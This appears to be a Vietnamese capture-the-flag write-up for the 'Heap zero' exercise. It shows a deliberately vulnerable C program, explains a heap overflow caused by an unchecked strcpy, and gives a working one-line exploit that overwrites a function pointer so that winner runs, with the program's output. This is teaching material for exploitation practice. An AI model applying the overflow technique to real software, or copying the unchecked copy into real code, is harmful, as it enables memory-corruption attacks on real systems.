# Heap zero
Source code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
  char name[64];
};

struct fp {
  int (*fp)();
};

void winner()
{
  printf("level passed\n");
}

void nowinner()
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);
  
  f->fp();

}
```

Đầu tiên, chương trình cấp phát hai khối heap riêng biệt, một khối lớn 0x40 hay 64 byte và khối còn lại chỉ 4 byte (tạm gọi là ptr0 và ptr1). Sau đó, nó đặt ptr1 bằng hàm `nowinner`. Sau đó, nó in giá trị của ptr0 và ptr1 (vì vậy đó là nơi xuất phát hai địa chỉ heap của chúng ta). 
Tiếp tục sao chép dữ liệu đầu vào mà chúng ta đã nhập thông qua đối số cho ptr0 nhưng lại không kiểm tra điều kiện nhập vào, điều này có thể gây ra lỗi tràn heap. Tiếp tục nó thực thi địa chỉ được trỏ bởi ptr1.
Do vậy chúng ta sẽ ghi đè giá trị của `ptr1` cho hàm `winner`.
Khi chạy chương trình ta thấy ptr0 đang ở vị trí 0x56c08160 và ptr1 đang ở vị trí 0x56c081b0
Mà 0x56c081b0 - 0x56c08160 = 0x50
Do đó chúng ta cần ghi đè 0x50 bytes và địa chỉ của hàm winner
Địa chỉ này được tìm được với :
```bash
$    objdump -D heap0 | grep winner
080484b6 <winner>:
080484e1 <nowinner>:
```

cuối cùng ta có script exploit
```bash
$    ./heap0 `python -c 'print "0"*0x50 + "\xb6\x84\x04\x08"'`
data is at 0x98ac160, fp is at 0x98ac1b0
level passed
```